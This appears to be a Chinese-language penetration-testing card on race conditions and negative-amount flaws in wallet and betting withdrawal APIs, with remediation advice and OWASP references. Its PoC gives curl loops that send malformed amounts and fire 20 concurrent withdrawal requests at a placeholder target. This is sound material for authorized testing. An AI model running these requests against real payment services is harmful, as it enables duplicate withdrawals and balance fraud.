---
title: 余额并发与负数（竞态 / 金额符号）
cve: 无（业务逻辑）
severity: critical
cvss: 9.0
product: 自研钱包与投注接口
versions: 任意
ports: 80, 443
keywords: 竞态, race condition, 并发提现, 负数, 金额校验, 幂等
entry: 同一请求并发 20 次 / amount=-100
verified: false
sources: 公开资料整理（业务逻辑类，无 CVE）
---

## 指纹

- 提现/下注/兑换/转额度接口没有幂等键（无 `requestId`/`nonce`），余额"先读后写"。
- 金额参数在前端：`{"amount":100}`，服务端只判"余额够不够"。

## 前置条件

- 授权测试账号 + 小额余额；并发测试要**事先**确认该站有没有"取消提现/作废单据"的会员端接口（有它才能做零敞口验证，见第 1 步）。

## PoC

```bash
# 1) 先做低敞口探测：负数 / 0 / 极小值 / 科学计数法（不产生出款单）
for amt in -100 -0.01 0 0.0001 1e-2; do   # 1e3=1000 是合法正数会真建大额单；类型混淆请用字符串 "1e3"
  curl -s -X POST https://target/api/withdraw/create \
    -H "Authorization: Bearer <token>" -H 'Content-Type: application/json' \
    -d "{\"amount\":$amt,\"bankId\":1}" -o /dev/null -w "amount=$amt → %{http_code}\n"
done

#    探针后必须回读单据数：探针前后各查一次 list，n 不变才算"未产生出款单"
#    正数对照：同余额下再打一次 +100，返回"余额不足"说明只是余额校验，不能据此认定符号校验缺失

# 2) 并发：同一提现请求一次性 20 并发（单账号、最小金额）——只打一波，禁止循环重放/持续压测
seq 20 | xargs -P 20 -I{} curl -s -o /dev/null -X POST https://target/api/withdraw/create \
  -H "Authorization: Bearer <token>" -H 'Content-Type: application/json' \
  -d '{"amount":10,"bankId":1}'
```

## 利用步骤

1. **先低敞口**：负数/0/科学计数法只需几次单发请求，判定"服务端是否校验金额符号与类型"，不产生出款单。被判"金额非法"才算符号校验缺失；返回"余额不足"时要用正数对照才能区分。
2. 再并发：记录初始余额 B0 与单据数 n0 → 一次性 20 并发 → 记录 B1、n1。
3. 判定（任一成立；并发只打一波，循环重放会累积敞口并触发风控告警）：`n1 - n0 ≥ 2`（生成多笔可提现单）、`B0 - B1` 的扣减次数 ≥ 2（余额被重复扣）、或负数导致余额增加。
4. **敞口 = (n1 - n0) × 单笔金额 − 实际应有扣减**；立刻用会员端"取消提现"把多余单据作废（没有取消接口就**别做并发**，改用负数/幂等重复的低敞口路径取证）。
5. 判定"幂等缺失"也可以不产生资金动作：同一 `requestId` 连发两次，若两次都 2xx 且各生成一条记录即成立。
6. 证据：B0/B1、n0/n1、请求时间戳；测试单号与作废结果。

## 修复与缓解（加固）

- 幂等键（`requestId` 唯一索引）+ 分布式锁。
- 余额操作走 DB 事务 `SELECT ... FOR UPDATE` 或乐观锁 `version`；扣减与建单同事务。
- 金额服务端校验：正数、上限、两位小数；拒绝科学计数法与字符串类型。

## 参考

- OWASP WSTG-BUSL-04（竞态）；OWASP Top 10 A04 Insecure Design。
